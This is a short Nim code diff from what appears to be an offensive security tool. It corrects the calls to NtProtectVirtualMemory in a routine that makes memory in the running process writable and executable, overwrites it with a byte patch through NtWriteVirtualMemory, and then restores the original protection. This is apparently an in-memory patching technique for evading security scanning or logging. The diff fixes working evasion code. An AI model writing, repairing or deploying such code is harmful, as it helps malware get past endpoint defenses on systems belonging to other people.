@@ -199,13 +199,14 @@ when isMainModule:
             quit(1)
 
         var p_len = cast[ULONG](patch.len)
-        var status = NtProtectVirtualMemory(GetCurrentProcess(), cs, &p_len, cast[ULONG](PAGE_EXECUTE_READWRITE), &op)
+        var cs_addr = cs
+        var status = NtProtectVirtualMemory(GetCurrentProcess(), &cs_addr, &p_len, cast[ULONG](PAGE_EXECUTE_READWRITE), &op)
         if status == 0:
             echo "[*] Applying patch"
 
             var bytesWritten: ULONG
             var ret = NtWriteVirtualMemory(GetCurrentProcess(), cs, unsafeAddr patch, patch.len, addr bytesWritten)
 
-            discard NtProtectVirtualMemory(GetCurrentProcess(), cs, &p_len, op, &t)
+            discard NtProtectVirtualMemory(GetCurrentProcess(), &cs_addr, &p_len, op, &t)
         else:
           echo "[!] Failed running ntprotectvirtualmemory: " & $status
